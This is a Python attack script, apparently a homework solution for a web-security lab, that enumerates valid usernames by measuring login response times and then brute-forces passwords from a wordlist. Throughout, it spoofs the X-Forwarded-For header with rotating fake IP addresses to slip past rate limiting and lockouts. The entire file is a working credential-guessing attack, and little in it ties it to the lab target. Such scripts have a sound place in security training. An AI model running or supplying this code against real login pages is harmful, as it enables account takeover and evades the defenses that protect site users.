import requests
import statistics
import time
import sys
from bs4 import BeautifulSoup

def run_test(username: str, password: str, url: str, ip: str, trials: int = 3) -> float: # trials=3 to trials=5/7/10 to reduce jitter, but 3 is quickest to users (10 statistically)
    """
    Measures average response time for login attempts to detect timing discrepancies
    which may indicate a valid username.

    Args:
        username (str): Username to test
        password (str): Arbitrary long password (e.g., 64 'a's)
        url (str): Target login URL
        ip (str): Spoofed IP address via X-Forwarded-For header
        trials (int): Number of repeated requests to average out timing noise

    Returns:
        float: Average response time in seconds
    """
    times = []
    for _ in range(trials):
        headers = {
            'X-Forwarded-For': ip,
            'User-Agent': 'Mozilla/5.0',
        }
        data = {'username': username, 'password': password}
        try:
            resp = requests.post(url, headers=headers, data=data, timeout=5)
            times.append(resp.elapsed.total_seconds())
        except Exception as e:
            print(f"[!] Error during timing request: {e}")
            times.append(0.0)
        time.sleep(0.2) # short delay to avoid rate limiting
    return statistics.mean(times)

def check_login(site: str, username: str, password: str, ip: str) -> bool:
    """
    Sends login request and verifies success by checking redirection and page content.

    Args:
        site (str): Root URL of the lab
        username (str): Username to validate
        password (str): Password to validate
        ip (str): Spoofed IP address

    Returns:
        bool: True if login is successful, False otherwise
    """
    headers = {
        'X-Forwarded-For': ip,
        'User-Agent': 'Mozilla/5.0',
    }
    login_url = f"{site}/login"
    data = {'username': username, 'password': password}

    s = requests.Session()
    try:
        resp = s.post(login_url, headers=headers, data=data, allow_redirects=False)
        if resp.status_code == 302 and 'Location' in resp.headers:
            redirected_url = site + resp.headers['Location']
            final = s.get(redirected_url, headers=headers)
            if "Your username is:" in final.text or "My account" in final.text:
                return True
    except Exception as e:
        print(f"[!] Error during login check: {e}")
    return False

# === MAIN EXECUTION OF SCRIPT ===
if len(sys.argv) != 2:
    print("Usage: python hw1.py <lab_url>")
    sys.exit(1)

site = sys.argv[1].rstrip('/')
login_url = f"{site}/login"

# Load candidate usernames and passwords
with open("auth-lab-usernames.txt") as f:
    usernames = [line.strip() for line in f if line.strip()]
with open("auth-lab-passwords.txt") as f:
    passwords = [line.strip() for line in f if line.strip()]

ip_counter = 1
username_timing = {}
print("\n[*] Starting timing attack to identify valid usernames...\n")

# Phase 1: Timing-based username enumeration
for name in usernames:
    spoof_ip = f"1.1.1.{ip_counter}"
    avg_time = run_test(name, 'a' * 64, login_url, spoof_ip)
    username_timing[name] = avg_time
    print(f"[i] Tried {name:<15} | Avg Time: {avg_time:.4f}s")
    ip_counter += 1

# Sort usernames by timing, used to get top 3
top_candidates = sorted(username_timing.items(), key=lambda item: item[1], reverse=True) # [:3] commented out for guaranteed run; [:20] best margin for noisy data
print("\n[+] Top candidates:")
for u, t in top_candidates:
    print(f"    {u:<15} | {t:.4f}s")

# Phase 2: Brute-force passwords for top usernames
print("\n[*] Beginning brute-force attempts on top candidates...\n")
for candidate_username, _ in top_candidates:
    print(f"[~] Trying password list for: {candidate_username}\n")
    for pwd in passwords:
        spoof_ip = f"1.1.1.{ip_counter}"
        if check_login(site, candidate_username, pwd, spoof_ip):
            print(f"[\u2713] SUCCESS \u2014 Username: {candidate_username}, Password: {pwd}")
            print("[\u2713] Visit the lab page to verify completion.")
            sys.exit(0)
        else:
            print(f"[x] Tried password: {pwd}")
        ip_counter += 1

print("[!] Password not found. Wordlist may be incomplete or detection failed.")
